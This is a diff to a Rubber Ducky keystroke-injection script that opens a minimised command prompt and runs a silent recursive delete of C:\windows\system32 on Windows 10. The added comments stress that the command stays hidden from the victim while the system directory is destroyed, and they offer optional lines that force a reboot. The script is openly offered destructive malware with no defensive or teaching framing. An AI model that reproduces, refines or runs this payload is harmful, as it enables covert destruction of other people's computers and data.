@@ -1,6 +1,8 @@
-REM Deletes System32 directory as Administrator using command prompt payload 
+REM Deletes System32 directory as User or Administrator using command prompt payload 
 REM Obviouly a rubber ducky script that deletes important directory of 
-REM windows operating system using command prompt.
+REM windows operating system using command prompt. The running command will be hidden to
+REM victims eyes as the payload destroys the system directory without him/her knowing.
+REM It works on windows 10 and differently on windows 8.1
 DELAY 4000
 GUI 
 DELAY 800
@@ -14,6 +16,9 @@ ENTER
 DELAY 500
 STRING start /MIN cmd /C RD /Q /S "c:\windows\system32"
 DELAY 500
-ENTER
+ENTER 
+REM DELAY 500 (Remove the REM command if you want to add an autoreboot command to the script. Also Remove these parentheses including these words.)
+REM STRING shutdown /r /t 3 (Remove the REM command if you want to add an autoreboot command to the script.  Also Remove these parentheses including these words.)
+REM ENTER (Remove the REM command if you want to add an autoreboot command to the script.  Also Remove these parentheses including these words.) 
 DELAY 500
 STRING exit
